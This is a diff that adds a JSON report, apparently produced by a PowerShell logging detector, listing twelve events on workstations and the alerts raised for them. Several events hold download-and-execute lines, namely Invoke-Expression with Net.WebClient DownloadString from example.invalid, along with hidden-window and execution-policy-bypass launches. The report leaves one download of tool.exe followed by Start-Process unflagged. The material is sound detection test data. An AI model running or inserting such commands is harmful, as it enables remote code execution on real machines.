@@ -1,0 +1,286 @@
+{
+    "summary": {
+        "generated_at": "2026-11-25T19:14:29.992687+00:00",
+        "total_events": 12,
+        "suspicious_events": 5,
+        "normal_events": 7,
+        "skipped_events": 0,
+        "event_types": {
+            "4104": 9,
+            "4688": 2,
+            "403": 1
+        },
+        "severity_levels": {
+            "LOW": 7,
+            "MEDIUM": 2,
+            "HIGH": 1,
+            "CRITICAL": 2
+        },
+        "top_hosts": {
+            "WS-ADMIN01": 3,
+            "WS-USER05": 2,
+            "WS-USER08": 2,
+            "WS-DEV02": 1,
+            "WS-ADMIN02": 1,
+            "WS-USER10": 1,
+            "WS-USER12": 1,
+            "WS-USER15": 1
+        },
+        "top_users": {
+            "administrator": 4,
+            "user01": 2,
+            "user08": 2,
+            "developer": 1,
+            "user10": 1,
+            "user12": 1,
+            "user15": 1
+        },
+        "detection_rule_counts": {
+            "Encoded PowerShell Command": 1,
+            "Download and Execute Pattern": 2,
+            "Invoke Expression with Remote Content": 2,
+            "Remote Script Execution": 2,
+            "Execution Policy Bypass": 2,
+            "Hidden PowerShell Window": 1,
+            "Suspicious PowerShell Combination": 1,
+            "Base64 Decoding": 1
+        },
+        "total_alerts": 12
+    },
+    "events": [
+        {
+            "timestamp": "2026-11-20T09:10:15+00:00",
+            "event_id": 4104,
+            "computer": "WS-ADMIN01",
+            "user": "administrator",
+            "process_id": 2480,
+            "process": "powershell.exe",
+            "host_application": "-NoProfile -File C:\\Scripts\\Inventory.ps1",
+            "script_block": "Get-Process; Get-Service",
+            "alerts": [],
+            "is_suspicious": false,
+            "severity": "LOW"
+        },
+        {
+            "timestamp": "2026-11-20T09:12:30+00:00",
+            "event_id": 4104,
+            "computer": "WS-USER05",
+            "user": "user01",
+            "process_id": 3120,
+            "process": "powershell.exe",
+            "host_application": "-EncodedCommand SQBFAFgA",
+            "script_block": "IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/payload.ps1')",
+            "alerts": [
+                {
+                    "rule_name": "Encoded PowerShell Command",
+                    "category": "Obfuscation",
+                    "severity": "HIGH",
+                    "description": "PowerShell was launched with an encoded command argument."
+                },
+                {
+                    "rule_name": "Download and Execute Pattern",
+                    "category": "Download and Execution",
+                    "severity": "CRITICAL",
+                    "description": "A remote download pattern was combined with execution behavior."
+                },
+                {
+                    "rule_name": "Invoke Expression with Remote Content",
+                    "category": "Remote Execution",
+                    "severity": "CRITICAL",
+                    "description": "Invoke-Expression appears alongside remote content retrieval."
+                },
+                {
+                    "rule_name": "Remote Script Execution",
+                    "category": "Remote Execution",
+                    "severity": "HIGH",
+                    "description": "A remote script or command execution pattern was detected."
+                }
+            ],
+            "is_suspicious": true,
+            "severity": "CRITICAL"
+        },
+        {
+            "timestamp": "2026-11-20T09:14:05+00:00",
+            "event_id": 4688,
+            "computer": "WS-USER05",
+            "user": "user01",
+            "process_id": 3190,
+            "process": "powershell.exe",
+            "host_application": "-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile",
+            "script_block": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden",
+            "alerts": [
+                {
+                    "rule_name": "Execution Policy Bypass",
+                    "category": "Execution Policy",
+                    "severity": "MEDIUM",
+                    "description": "PowerShell execution policy bypass was requested."
+                },
+                {
+                    "rule_name": "Hidden PowerShell Window",
+                    "category": "Stealth Execution",
+                    "severity": "MEDIUM",
+                    "description": "PowerShell was configured to run with a hidden window."
+                },
+                {
+                    "rule_name": "Suspicious PowerShell Combination",
+                    "category": "Defense Evasion",
+                    "severity": "HIGH",
+                    "description": "Multiple suspicious PowerShell execution options were combined."
+                }
+            ],
+            "is_suspicious": true,
+            "severity": "HIGH"
+        },
+        {
+            "timestamp": "2026-11-20T09:18:42+00:00",
+            "event_id": 4104,
+            "computer": "WS-DEV02",
+            "user": "developer",
+            "process_id": 4280,
+            "process": "powershell.exe",
+            "host_application": "-Command Get-ChildItem C:\\Projects",
+            "script_block": "Get-ChildItem C:\\Projects -Recurse",
+            "alerts": [],
+            "is_suspicious": false,
+            "severity": "LOW"
+        },
+        {
+            "timestamp": "2026-11-20T09:20:11+00:00",
+            "event_id": 4104,
+            "computer": "WS-USER08",
+            "user": "user08",
+            "process_id": 5120,
+            "process": "powershell.exe",
+            "host_application": "-Command Invoke-WebRequest",
+            "script_block": "Invoke-WebRequest -Uri http://example.invalid/tool.exe -OutFile C:\\Temp\\tool.exe",
+            "alerts": [],
+            "is_suspicious": false,
+            "severity": "LOW"
+        },
+        {
+            "timestamp": "2026-11-20T09:21:03+00:00",
+            "event_id": 4104,
+            "computer": "WS-USER08",
+            "user": "user08",
+            "process_id": 5120,
+            "process": "powershell.exe",
+            "host_application": "-Command Start-Process",
+            "script_block": "Start-Process C:\\Temp\\tool.exe",
+            "alerts": [],
+            "is_suspicious": false,
+            "severity": "LOW"
+        },
+        {
+            "timestamp": "2026-11-20T09:25:19+00:00",
+            "event_id": 4688,
+            "computer": "WS-ADMIN02",
+            "user": "administrator",
+            "process_id": 6120,
+            "process": "powershell.exe",
+            "host_application": "-NoExit -Command Get-Service",
+            "script_block": "powershell.exe -NoExit -Command Get-Service",
+            "alerts": [],
+            "is_suspicious": false,
+            "severity": "LOW"
+        },
+        {
+            "timestamp": "2026-11-20T09:29:40+00:00",
+            "event_id": 4104,
+            "computer": "WS-USER10",
+            "user": "user10",
+            "process_id": 7120,
+            "process": "powershell.exe",
+            "host_application": "-Command Set-ExecutionPolicy Bypass",
+            "script_block": "Set-ExecutionPolicy Bypass -Scope Process",
+            "alerts": [
+                {
+                    "rule_name": "Execution Policy Bypass",
+                    "category": "Execution Policy",
+                    "severity": "MEDIUM",
+                    "description": "PowerShell execution policy bypass was requested."
+                }
+            ],
+            "is_suspicious": true,
+            "severity": "MEDIUM"
+        },
+        {
+            "timestamp": "2026-11-20T09:32:50+00:00",
+            "event_id": 4104,
+            "computer": "WS-USER12",
+            "user": "user12",
+            "process_id": 8120,
+            "process": "powershell.exe",
+            "host_application": "-Command FromBase64String",
+            "script_block": "[Convert]::FromBase64String('VGVzdENvbW1hbmQ=')",
+            "alerts": [
+                {
+                    "rule_name": "Base64 Decoding",
+                    "category": "Obfuscation",
+                    "severity": "MEDIUM",
+                    "description": "A Base64 decoding operation was detected."
+                }
+            ],
+            "is_suspicious": true,
+            "severity": "MEDIUM"
+        },
+        {
+            "timestamp": "2026-11-20T09:35:10+00:00",
+            "event_id": 4104,
+            "computer": "WS-ADMIN01",
+            "user": "administrator",
+            "process_id": 2480,
+            "process": "powershell.exe",
+            "host_application": "-File C:\\Scripts\\Backup.ps1",
+            "script_block": "Copy-Item C:\\Data D:\\Backup -Recurse",
+            "alerts": [],
+            "is_suspicious": false,
+            "severity": "LOW"
+        },
+        {
+            "timestamp": "2026-11-20T09:38:22+00:00",
+            "event_id": 4104,
+            "computer": "WS-USER15",
+            "user": "user15",
+            "process_id": 9120,
+            "process": "powershell.exe",
+            "host_application": "-Command Invoke-Expression",
+            "script_block": "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://example.invalid/script.ps1')",
+            "alerts": [
+                {
+                    "rule_name": "Download and Execute Pattern",
+                    "category": "Download and Execution",
+                    "severity": "CRITICAL",
+                    "description": "A remote download pattern was combined with execution behavior."
+                },
+                {
+                    "rule_name": "Invoke Expression with Remote Content",
+                    "category": "Remote Execution",
+                    "severity": "CRITICAL",
+                    "description": "Invoke-Expression appears alongside remote content retrieval."
+                },
+                {
+                    "rule_name": "Remote Script Execution",
+                    "category": "Remote Execution",
+                    "severity": "HIGH",
+                    "description": "A remote script or command execution pattern was detected."
+                }
+            ],
+            "is_suspicious": true,
+            "severity": "CRITICAL"
+        },
+        {
+            "timestamp": "2026-11-20T09:40:00+00:00",
+            "event_id": 403,
+            "computer": "WS-ADMIN01",
+            "user": "administrator",
+            "process_id": 2480,
+            "process": "powershell.exe",
+            "host_application": "Engine stopped",
+            "script_block": "PowerShell engine stopped",
+            "alerts": [],
+            "is_suspicious": false,
+            "severity": "LOW"
+        }
+    ],
+    "errors": []
+}
